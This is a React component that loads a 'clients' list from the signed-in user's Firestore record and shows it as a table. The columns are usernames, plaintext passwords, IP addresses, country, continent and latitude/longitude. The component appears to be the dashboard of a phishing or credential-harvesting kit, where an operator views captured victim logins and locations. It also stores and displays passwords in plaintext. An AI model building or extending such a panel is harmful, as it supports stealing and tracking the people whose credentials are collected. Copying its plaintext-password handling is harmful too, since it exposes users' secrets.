import React, { useEffect, useState } from "react";
import { db } from "../../config/firebase";
import { getDoc, doc } from "firebase/firestore";

type Props = {
  user: any;
};

const UsersTable = ({ user }: Props) => {
  const TABLE_HEADS = [
    "ID",
    "USERNAME",
    "PASSWORD",
    "IP",
    "COUNTRY",
    "CAPITAL",
    "CONTINENT",
    "LATITUDE",
    "LONGITUDE",
  ];

  const [clients, setClients] = useState<any>([]);

  const usersDocRef = doc(db, "users", user.uid);

  console.log(user);

  useEffect(() => {
    const getUsers = async () => {
      try {
        const data = await getDoc(usersDocRef);
        // console.log();
        setClients(data?.data()?.clients);
      } catch (error) {
        console.error(error);
      }
    };

    getUsers();
  }, []);

  return (
    <div className="border border-neutral-500 rounded-xl h-full overflow-x-auto">
      <table className="w-full">
        <thead>
          <tr>
            {TABLE_HEADS.map((head, i) => (
              <th key={i} className="py-5 px-3">
                <p className="text-center text-xs">{head}</p>
              </th>
            ))}
          </tr>
        </thead>
        <tbody>
          {clients.map((data: any, i: number) => (
            <tr key={i} className={`${"border-t border-neutral-400"}`}>
              {/* ID */}
              <td className="text-center py-5 text-xs">{i + 1}</td>

              {/* USERNAME */}
              <td className="text-center py-5 text-xs">{data.username}</td>

              {/* PASSWORD */}
              <td className="text-center py-5 text-xs">{data.password}</td>

              {/* IP */}
              <td className="text-center py-5 text-xs">{data.ip}</td>

              {/* COUNTRY */}
              <td className="text-center py-5 text-xs">{data.country}</td>

              {/* CITY */}
              <td className="text-center py-5 text-xs">{data.capital}</td>

              {/* CONTINENT */}
              <td className="text-center py-5 text-xs">{data.continent}</td>

              {/* LATITUDE */}
              <td className="text-center py-5 text-xs">{data.latitude}</td>

              {/* LONGITUDE */}
              <td className="text-center py-5 text-xs">{data.longitude}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};

export default UsersTable;
